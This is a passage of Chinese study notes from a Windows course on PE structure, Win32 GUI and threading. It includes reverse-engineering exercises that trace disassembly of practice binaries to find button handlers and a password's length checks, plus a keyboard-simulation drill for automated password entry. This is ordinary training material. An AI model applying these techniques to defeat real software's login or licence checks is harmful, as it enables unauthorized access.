printf(\"%s\",\"不存在重定位表...\"); return 0; } printf(\"========1=========\\n\"); PIMAGE_BASE_RELOCATION ReloCation = (_IAMGE_BASE_RELOCATION*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[5].VirtualAddress)); printf(\"===重定位表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[5].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[5].Size); int cnt = 0; while (true) { if (ReloCation-\u003eVirtualAddress != 0 \u0026\u0026 ReloCation-\u003eSizeOfBlock !=0) { printf(\"**********************************\\n\"); printf(\"%x\\n\",ReloCation); int num = (ReloCation-\u003eSizeOfBlock - 8) / 2; for (int i =0;i\u003cnum-1;i++) { WORD* offset = (WORD*)((char*)ReloCation+8+2*i); if (*offset \u003e= 0x3000) { printf(\"第%x项\\t地址:%X\\t偏移:%X\\n\", ReloCation-\u003eVirtualAddress, *offset-0x3000); } } ReloCation = (_IMAGE_BASE_RELOCATION*)((char*)ReloCation + ReloCation-\u003eSizeOfBlock); cnt++; }else{ break; } } printf(\"%d\\n\", cnt); } 重定位表这样设计有什么好处？\n用最少的空间来记录要修改的地址\n移动导出表-重定位表 在DLL新增一个节，并将导出表信息移动到这个新的节中 使用工具打开修改后的DLL看能否正常解析 在DLL中新增一个节，并将重定位表移动到这个新的节中 修改DLL的ImageBase,根据重定位表修正，然后存盘。看DLL是否可以使用 导入表 打印notepad.exe导入表的全部信息 Win32 宽字符 分别使用wchar_t / wprintf / wcslen / wcscpy / wcscat / wcscmp / wcsstr写一个例子\n#include \u003cwindows.h\u003e #include \"main.h\" #include \u003clocale.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow) { setlocale(LC_ALL,\"\"); wchar_t str1[] = L\"你好\"; wchar_t str2[] = L\"世界\"; wprintf(L\"打印：%ls,%ls\\n\",str1,str2); int Len = wcslen(str1); printf(\"%d\\n\",Len); wcscpy(str1,str2); wprintf(L\"打印：%ls,%ls\\n\",str1,str2); wcscat(str1,str1); wprintf(L\"打印：%ls,%ls\\n\",str1,str2); int dif = wcscmp(str1,str2); printf(\"%d\\n\",dif); wchar_t* search = wcsstr(str1,L\"世\"); wprintf(L\"%ls\\n\",search); return 0; } 查MSDN了解WinMain其他3个参数的意义\nint WINAPI WinMain( HINSTANCE hInstance, // 应用程序当前实例的句柄 HINSTANCE hPrevInstance, // 应用程序先前实例的句柄 (现在通常为NULL) LPSTR lpCmdLine, // 指向应用程序命令行字符串的指针 (就是命令行参数) int nCmdShow // 指定窗口应如何显示 (是否被最小化，最大化或正常显示) ); 事件-消息 创建一个窗口程序，学习如何查询文档\n#include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e HINSTANCE hAppInstance; LRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ); int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. hAppInstance = hInstance; //窗口的类名 PSTR className = \"My First Window\"; // 创建窗口类的对象 WNDCLASS wndclass = {0};\t//一定要先将所有值赋值 wndclass.hbrBackground = (HBRUSH)COLOR_MENU;\t//窗口的背景色 wndclass.hCursor = LoadCursor(NULL,IDC_APPSTARTING);\twndclass.lpfnWndProc = WindowProc;\t//窗口过程函数 wndclass.lpszClassName = className;\t//窗口类的名字\twndclass.hInstance = hInstance;\t//定义窗口类的应用程序的实例句柄 // 注册窗口类 // 参加MSDN文档RegisterClass-\u003eParameters： // You must fill the structure with the appropriate class attributes // before passing it to the function. RegisterClass(\u0026wndclass); // 创建窗口 HWND hwnd = CreateWindow( className,\t//类名 \"我的第一个窗口\",\t//窗口标题 WS_OVERLAPPEDWINDOW,\t//窗口外观样式 10,\t//相对于父窗口的X坐标 10,\t//相对于父窗口的Y坐标 600,\t//窗口的宽度 300,\t//窗口的高度 NULL,\t//父窗口句柄，为NULL NULL,\t//菜单句柄，为NULL hInstance,\t//当前应用程序的句柄 NULL);\t//附加数据一般为NULL if(hwnd == NULL)\t//是否创建成功 return 0; // 显示窗口 ShowWindow(hwnd, SW_SHOW); // 更新窗口 UpdateWindow(hwnd); // 消息循环 MSG msg; while(GetMessage(\u0026msg, NULL, 0, 0)) { TranslateMessage(\u0026msg); DispatchMessage(\u0026msg); } return 0; } LRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ) { switch(uMsg) { //窗口消息 case WM_CREATE: { printf(\"WM_CREATE %d %d\\n\",wParam,lParam); CREATESTRUCT* createst = (CREATESTRUCT*)lParam; printf(\"CREATESTRUCT %s\\n\",createst-\u003elpszClass); break; } case WM_MOVE: { printf(\"WM_MOVE %d %d\\n\",wParam,lParam); POINTS points = MAKEPOINTS(lParam); printf(\"X Y %d %d\\n\",points.x,points.y); break; } case WM_SIZE: { printf(\"WM_SIZE %d %d\\n\",wParam,lParam); int newWidth = (int)(short) LOWORD(lParam); int newHeight = (int)(short) HIWORD(lParam); printf(\"WM_SIZE %d %d\\n\",newWidth,newHeight); break; } case WM_DESTROY: { printf(\"WM_DESTROY %d %d\\n\",wParam,lParam); PostQuitMessage(0); return 0; break; } //键盘消息 case WM_KEYUP: { printf(\"WM_KEYUP %d %d\\n\",wParam,lParam); break; } case WM_KEYDOWN: { printf(\"WM_KEYDOWN %d %d\\n\",wParam,lParam); break; } //鼠标消息 case WM_LBUTTONDOWN: { printf(\"WM_LBUTTONDOWN %d %d\\n\",wParam,lParam); POINTS points = MAKEPOINTS(lParam); printf(\"WM_LBUTTONDOWN %d %d\\n\",points.x,points.y); break; } default: return DefWindowProc(hwnd,uMsg,wParam,lParam); } return 0; } 查一下Windows有多少种消息，概要了解一下每个消息的作用\nWNDCLASS wndclass = {0};与WNDCLASS wndclass;的区别是什么\n要对里面的成员全面初始化\nesp寻址-定位回调函数 找到那三个字母\n.text:00401124 cmp eax, 41h ; 'A' .text:00401127 jz short loc_401172 .text:00401129 cmp eax, 46h ; 'F' .text:0040112C jz short loc_401161 .text:0040112E cmp eax, 67h ; 'g' .text:00401131 jz short loc_401150 根据WndClass里面的回调函数可以找到这个比较。不过这个67h好像是小键盘的7。\n子窗口-消息处理函数 找到按钮另外的操作\n.text:0040111A cmp eax, 3E9h .text:0040111F jnz short loc_401144 .text:00401121 push 0 ; uType .text:00401123 push offset Caption ; \"Demo\" .text:00401128 push offset Text ; \"Find Me 1\" .text:0040112D push 0 ; hWnd .text:0040112F mov dword_408514, 1 .text:00401139 call ds:MessageBoxA .text:0040113F xor eax, eax .text:00401141 retn 10h .text:00401144 ; --------------------------------------------------------------------------- .text:00401144 .text:00401144 loc_401144: ; CODE XREF: sub_401100+1F↑j .text:00401144 cmp eax, 3EAh .text:00401149 jnz short loc_40116E .text:0040114B push 0 ; uType .text:0040114D push offset Caption ; \"Demo\" .text:00401152 push offset aFindMe2 ; \"Find Me 2\" .text:00401157 push 0 ; hWnd .text:00401159 mov dword_408514, 2 .text:00401163 call ds:MessageBoxA .text:00401169 xor eax, eax .text:0040116B retn 10h .text:0040116E ; --------------------------------------------------------------------------- .text:0040116E .text:0040116E loc_40116E: ; CODE XREF: sub_401100+49↑j .text:0040116E cmp eax, 3EBh .text:00401173 jnz short loc_401198 .text:00401175 push 0 ; uType .text:00401177 push offset Caption ; \"Demo\" .text:0040117C push offset aFindMe3 ; \"Find Me 3\" .text:00401181 push 0 ; hWnd .text:00401183 mov dword_408514, 3 .text:0040118D call ds:MessageBoxA .text:00401193 xor eax, eax .text:00401195 retn 10h 应该是向地址0x408514分别赋值1，2，3\n通过反汇编其实可以看到，因为这三个按钮是属于这个窗口类的所以这些按钮的回调函数也会在窗口的WndProc下。点击按钮的消息与点击窗口的消息会分开，似乎是因为if…else…隔开了。\n资源文件-消息断点 找回调1\n00401060 \u003e \\8B4C24 08 MOV ECX,DWORD PTR SS:[ESP+8] ; Case 3EA of switch 0040104D 00401064 . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 00401066 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 0040106B . 68 48604000 PUSH ReverseT.00406048 ; |Text = \"Button 3\" 00401070 . 51 PUSH ECX ; |hOwner 00401071 . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA 00401077 . 8BC6 MOV EAX,ESI 00401079 . 5E POP ESI 0040107A . C2 1000 RETN 10 0040107D \u003e 8B5424 08 MOV EDX,DWORD PTR SS:[ESP+8] ; Case 3E9 of switch 0040104D 00401081 . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 00401083 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 00401088 . 68 3C604000 PUSH ReverseT.0040603C ; |Text = \"Button 2\" 0040108D . 52 PUSH EDX ; |hOwner 0040108E . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA 00401094 . 8BC6 MOV EAX,ESI 00401096 . 5E POP ESI 00401097 . C2 1000 RETN 10 0040109A \u003e 8B4424 08 MOV EAX,DWORD PTR SS:[ESP+8] ; Case 3E8 of switch 0040104D 0040109E . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 004010A0 . 68 60604000 PUSH ReverseT.00406060 ; |Title = \"Demo\" 004010A5 . 68 30604000 PUSH ReverseT.00406030 ; |Text = \"Button 1\" 004010AA . 50 PUSH EAX ; |hOwner 004010AB . FF15 A0504000 CALL NEAR DWORD PTR DS:[4050A0] ; \\MessageBoxA 找密码\n首先是调了一个函数判断EAX，后面就是是否输入正确进行跳转：\n004010D3 . E8 28FFFFFF CALL ReverseT.00401000 004010D8 . 83C4 04 ADD ESP,4 004010DB . 85C0 TEST EAX,EAX 004010DD . 6A 00 PUSH 0 ; /Style = MB_OK|MB_APPLMODAL 004010DF . 74 18 JE SHORT ReverseT.004010F9 ; | 后面的比较的位置应该是下面的代码：\n0040105C |. 8D7C24 0C LEA EDI,DWORD PTR SS:[ESP+C] 00401060 |. 83C9 FF OR ECX,FFFFFFFF 00401063 |. 33C0 XOR EAX,EAX 00401065 |. F2:AE REPNE SCAS BYTE PTR ES:[EDI] 00401067 |. F7D1 NOT ECX 00401069 |. 49 DEC ECX 0040106A |. 83F9 03 CMP ECX,3 0040106D |. 75 20 JNZ SHORT ReverseT.0040108F 0040106F |. 8D7C24 5C LEA EDI,DWORD PTR SS:[ESP+5C] 00401073 |. 83C9 FF OR ECX,FFFFFFFF 00401076 |. F2:AE REPNE SCAS BYTE PTR ES:[EDI] 00401078 |. F7D1 NOT ECX 0040107A |. 49 DEC ECX 0040107B |. 83F9 05 CMP ECX,5 0040107E |. 75 0F JNZ SHORT ReverseT.0040108F 因为前面是两个GetWindowTextA函数，所以有理由说明上面的获取我输入的内容，后面进行比较。\n资源表（PE） 编写程序，定位某个资源在PE文件中的位置 编写程序，提供程序图标资源 编写程序，修改对话框标题 项目 界面实现：\n// project.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cCommCtrl.h\u003e #pragma comment(lib,\"comctl32.lib\") VOID EnumMoudles(HWND hListProcess, WPARAM wParam, LPARAM lParam) { DWORD dwRowId; TCHAR szPid[21]; LV_ITEM lv; //初始化 memset(\u0026lv, 0, sizeof(LV_ITEM)); //获取选择行 dwRowId = SendMessage(hListProcess, LVM_GETNEXTITEM,-1 , LVNI_SELECTED); if (dwRowId == -1) { MessageBox(NULL, TEXT(\"请选择进程\"), TEXT(\"出错啦\"), MB_OK); return; } //获取PID lv.iSubItem = 1; lv.pszText = szPid; lv.cchTextMax = 0x20; SendMessage(hListProcess, LVM_GETITEMTEXT, dwRowId, (DWORD)\u0026lv); MessageBox(NULL, szPid, TEXT(\"PID\"), MB_OK); } VOID InitMoudleListView(HWND hDlg) { //设置窗口风格需要调用结构体 LV_COLUMN lv; HWND hListMoudles; //初始化 memset(\u0026lv, 0, sizeof(LV_COLUMN)); //获取模块列表句柄 hListMoudles = GetDlgItem(hDlg, IDC_LIST_Down); //设置整行选中 SendMessage(hListMoudles, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //第一列： lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"模块名称\"); lv.cx = 330; lv.iSubItem = 0; //ListView_Insertcolumn(hListMoudles,0,\u0026lv); SendMessage(hListMoudles, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //第二列： lv.pszText = TEXT(\"模块位置\"); lv.cx = 330; lv.iSubItem = 1; SendMessage(hListMoudles, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); } VOID EnumProcess(HWND hListProcess) { LV_ITEM vitem; //初始化，第一个进程 memset(\u0026vitem, 0, sizeof(LV_ITEM)); vitem.mask = LVIF_TEXT; //假数据： vitem.pszText = TEXT(\"csrss.exe\"); vitem.iItem = 0; vitem.iSubItem = 0; //ListView_Insertem(hListProcess,*vitem); SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"448\"); vitem.iItem = 0; vitem.iSubItem = 1; SendMessage(hListProcess, LVM_SETITEM, 0, (DWORD)\u0026vitem); //ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"56590000\"); vitem.iItem = 0; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"000F0000\"); vitem.iItem = 0; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); //第二个进程假数据： vitem.pszText = TEXT(\"QQ.exe\"); vitem.iItem = 1; vitem.iSubItem = 0; SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"153\"); vitem.iItem = 1; vitem.iSubItem = 1; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"65580000\"); vitem.iItem = 1; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"001E0000\"); vitem.iItem = 1; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); //第三个进程假数据： vitem.pszText = TEXT(\"WeChat.exe\"); vitem.iItem = 2; vitem.iSubItem = 0; SendMessage(hListProcess, LVM_INSERTITEM, 0, (DWORD)\u0026vitem); vitem.pszText = TEXT(\"256\"); vitem.iItem = 2; vitem.iSubItem = 1; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"75960000\"); vitem.iItem = 2; vitem.iSubItem = 2; ListView_SetItem(hListProcess, \u0026vitem); vitem.pszText = TEXT(\"015B0000\"); vitem.iItem = 2; vitem.iSubItem = 3; ListView_SetItem(hListProcess, \u0026vitem); } VOID InitProcessListView(HWND hDlg) { //设置窗口风格调用结构体 LV_COLUMN lv; HWND hListProcess; //初始化 memset(\u0026lv, 0, sizeof(LV_COLUMN)); //获取进程列表句柄 hListProcess = GetDlgItem(hDlg, IDC_LIST_Process); //设置整行选中 SendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //出错代码：：：：： //SendMessage(hListProcess, LVM_GETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); //第一列： lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"进程\"); //列标题 lv.cx = 225; //行宽 lv.iSubItem = 0; //ListView_InsertColumn(hListProcess,0,\u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //第二列 lv.pszText = TEXT(\"PID\"); lv.cx = 150; lv.iSubItem = 1; //ListView_InsertColumn(hListProcess, 1, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 1, (DWORD)\u0026lv); //第三列 lv.pszText = TEXT(\"镜像基址\"); lv.cx = 134; lv.iSubItem = 2; //ListView_InsertColumn(hListProcess, 2, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 2, (DWORD)\u0026lv); //第四列 lv.pszText = TEXT(\"镜像大小\"); lv.cx = 150; lv.iSubItem = 3; //ListView_InsertColumn(hListProcess, 3, \u0026lv); SendMessage(hListProcess, LVM_INSERTCOLUMN, 3, (DWORD)\u0026lv); EnumProcess(hListProcess); } BOOL CALLBACK MainDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam) { BOOL nRet = FALSE; switch (uMsg) { case WM_CLOSE: { EndDialog(hDlg, 0); PostQuitMessage(0); break; } case WM_INITDIALOG: { InitProcessListView(hDlg); //设置ProcessListView的风格，初始化进程列表 InitMoudleListView(hDlg); //设置MoudleListView的风格，初始化模块列表 break; } case WM_COMMAND: { switch (LOWORD(wParam)) { case IDC_BUTTON_protect: { //DialogBox(hIns, MAKEINTRESOURCE(IDD_ABOUTBOX), NULL, NULL); } case IDC_BUTTON_PE: { //打开新的对话框，PE查看器 return 0; } case IDC_BUTTON_logout: { EndDialog(hDlg, 0); PostQuitMessage(0); return TRUE; } } } case WM_NOTIFY: { NMHDR* pNMHDR = (NMHDR*)lParam; if (wParam == IDC_LIST_Down \u0026\u0026 pNMHDR-\u003ecode == NM_CLICK) { EnumMoudles(GetDlgItem(hDlg, IDC_LIST_Down), wParam, lParam); } break; } } return nRet; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, (DLGPROC)MainDlgProc); return 0; } 创建线程 一个加一个减\n// qqqq.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e HWND sub; HWND plus; DWORD WINAPI doSub(LPVOID lpParameter){ //获取文本框内容 TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(sub, szBuffer, 10); //字符转数字 DWORD time; sscanf(szBuffer, \"%d\", \u0026time); //计算并写回文本 while(time \u003e 0){ memset(szBuffer, 0, 10); Sleep(1000); sprintf(szBuffer,\"%d\", --time); SetWindowText(sub,szBuffer); } return 0; } DWORD WINAPI doPlus(LPVOID lpParameter){ //获取文本框内容 TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(plus, szBuffer, 10); //字符转数字 DWORD time; sscanf(szBuffer, \"%d\", \u0026time); //计算并写回文本 while(time \u003c 1000){ memset(szBuffer, 0, 10); Sleep(1000); sprintf(szBuffer,\"%d\", ++time); SetWindowText(plus,szBuffer); } return 0; } BOOL CALLBACK DialogProc( HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ) { switch(uMsg) { case WM_INITDIALOG : { //初始化文本框 sub = GetDlgItem(hwndDlg,IDC_EDIT_SUB); SetWindowText(sub,TEXT(\"1000\")); plus = GetDlgItem(hwndDlg, IDC_EDIT_ADD); SetWindowText(plus,TEXT(\"0\")); } return TRUE; case WM_COMMAND : switch (LOWORD (wParam)) { case IDC_BUTTON_START: HANDLE hThread = ::CreateThread(NULL, 0, doSub, NULL, 0, NULL); //如果不在其他的地方引用它 关闭句柄 ::CloseHandle(hThread); HANDLE hThread2 = ::CreateThread(NULL, 0, doPlus, NULL, 0, NULL); ::CloseHandle(hThread2); return TRUE; } break; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; } return FALSE; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, DialogProc); return 0; } 线程控制 值为什么不准确？\n通俗易懂的解释：\n假设有一个公共的白板，上面写着一个数字，比如 “0”。 现在有两个小朋友，小明和小红，他们都想轮流在这个白板上把数字加 1，并且每个人都要加 10000 次。 我们希望最终白板上的数字是 20000。\n小明想加 1： 小明走到白板前，看到上面写着 “0”，心里记住了 “现在是 0”。 小红也想加 1： 几乎同时，小红也走到白板前，也看到了上面写着 “0”，她也记住了 “现在是 0”。 小明写下新数字： 小明心算了一下 0 + 1 = 1，然后拿起笔，把白板上的 “0” 擦掉，写上了 “1”。 小红也写下新数字： 小红也心算了一下 0 + 1 = 1 （注意，她看到的是之前的 “0\"，而不是小明刚写的 “1\"），然后她也拿起笔，把白板上的 “0” （如果还没被擦掉）或者 “1” （如果已经被小明写上了，但是小红没注意到）擦掉，也写上了 “1\"。 结果： 本来我们希望小明和小红都加一次 1，白板上应该变成 “2\"，但是由于他们几乎同时操作，并且没有“协调好”，结果白板上最终只显示了 “1\"。 有一次加 1 的操作 “丢失” 了！\n临界区 通过使用临界区实现一个死锁程序\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e CRITICAL_SECTION cs1; CRITICAL_SECTION cs2; DWORD WINAPI ThreadProc1(LPVOID lpParameter) { printf(\"1\\n\"); EnterCriticalSection(\u0026cs1); Sleep(10000); EnterCriticalSection(\u0026cs2); LeaveCriticalSection(\u0026cs2); LeaveCriticalSection(\u0026cs1); printf(\"1 1\\n\"); return 0; } DWORD WINAPI ThreadProc2(LPVOID lpParameter) { printf(\"2\\n\"); EnterCriticalSection(\u0026cs2); Sleep(100); EnterCriticalSection(\u0026cs1); LeaveCriticalSection(\u0026cs1); LeaveCriticalSection(\u0026cs2); printf(\"2 2\\n\"); return 0; } int main(int argc, char* argv[]) { InitializeCriticalSection(\u0026cs1); InitializeCriticalSection(\u0026cs2); //创建一个新的线程 HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1,NULL, 0, NULL); //创建一个新的线程 HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2,NULL, 0, NULL); Sleep(100); //如果不在其他的地方引用它 关闭句柄 ::CloseHandle(hThread1); ::CloseHandle(hThread2); DeleteCriticalSection(\u0026cs1); DeleteCriticalSection(\u0026cs2); return 0; } 会发现输出中没有1 1和2 2。\n互斥体 第一步：在第一个文本框中输入一个值，比如1000。 第二步：点击抢红包，同时创建3个线程，每个线程循环进行抢红包的操作，每次抢50。 第三步：使用Mutex进行线程控制，当第一个文本框中的值\u003c50时，强红包线程结束。 特别说明： 1、四个文本框中的值总和应该为1000 2、强红包线程每次延时50毫秒。 3、使用WaitForMultipleObjects监听所有线程，当线程全部结束后调用CloseHandle关闭句柄。\n// test.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e HWND main_hwnd; HWND hwnd_A; HWND hwnd_B; HWND hwnd_C; HANDLE g_hMutex; DWORD WINAPI startnew_thread1(LPVOID lpParameter); DWORD WINAPI startnew_thread2(LPVOID lpParameter); DWORD WINAPI startnew_thread3(LPVOID lpParameter); DWORD WINAPI startnew_thread1(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_A, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_A, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew_thread2(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_B, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_B, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew_thread3(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_C, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_C, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew(LPVOID lpParameter) { g_hMutex = CreateMutex(NULL, FALSE, \"XYZ\"); if (g_hMutex == NULL) { MessageBox(NULL, TEXT(\"error\"), TEXT(\"error\"), MB_ICONERROR); return 1; } HANDLE hThread1 = ::CreateThread(NULL, 0, startnew_thread1, NULL, 0, NULL); HANDLE hThread2 = ::CreateThread(NULL, 0, startnew_thread2, NULL, 0, NULL); HANDLE hThread3 = ::CreateThread(NULL, 0, startnew_thread3, NULL, 0, NULL); HANDLE hThreads[3] = {hThread1, hThread2, hThread3}; WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); ::CloseHandle(hThread1); ::CloseHandle(hThread2); ::CloseHandle(hThread3); ::CloseHandle(g_hMutex); g_hMutex = NULL; return 0; } BOOL CALLBACK DialogProc( HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ) { switch (uMsg) { case WM_INITDIALOG: { main_hwnd = GetDlgItem(hwndDlg, IDC_EDIT_total); SetWindowText(main_hwnd, TEXT(\"1000\")); hwnd_A = GetDlgItem(hwndDlg, IDC_EDIT_1); // 线程1文本框 SetWindowText(hwnd_A, TEXT(\"0\")); hwnd_B = GetDlgItem(hwndDlg, IDC_EDIT_2); // 线程2文本框 SetWindowText(hwnd_B, TEXT(\"0\")); hwnd_C = GetDlgItem(hwndDlg, IDC_EDIT_3); // 线程3文本框 SetWindowText(hwnd_C, TEXT(\"0\")); } return TRUE; case WM_COMMAND: { switch (LOWORD(wParam)) { case IDC_BUTTON: // 按钮点击事件 HANDLE hThreadButton = ::CreateThread(NULL, 0, startnew, NULL, 0, NULL); ::CloseHandle(hThreadButton); return TRUE; } } break; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; } return FALSE; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DialogProc); return 0; } 鼠标_键盘 练习：\n遍历所有打开窗口，等待 设置鼠标位置，点击 模拟键盘输入密码 设置鼠标位置，单击登录 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e int main() { //ShowWindow(GetConsoleWindow(), SW_HIDE); STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi; si.cb = sizeof(si); RECT windowRect; BOOL res = CreateProcess( TEXT(\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsNotepad_11.2410.21.0_x64__8wekyb3d8bbwe\\\\Notepad\\\\Notepad.exe\"), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, \u0026si, \u0026pi); HWND hwnd = FindWindow(NULL, TEXT(\"Notepad\")); if (GetWindowRect(hwnd, \u0026windowRect)) { int centerX = windowRect.left + (windowRect.right - windowRect.left) / 2; int centerY = windowRect.top + (windowRect.bottom - windowRect.top) / 2; if (SetCursorPos(centerX, centerY)) { } else { return 1; } } else { return 1; } Sleep(1000); mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0); keybd_event(16,0,0,0); keybd_event(67,0,0,0); keybd_event(67,0,KEYEVENTF_KEYUP,0); keybd_event(16,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(54,0,0,0); keybd_event(54,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(53,0,0,0); keybd_event(53,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(77,0,0,0); keybd_event(77,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(65,0,0,0); keybd_event(65,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(69,0,0,0); keybd_event(69,0,KEYEVENTF_KEYUP,0); Sleep(100); 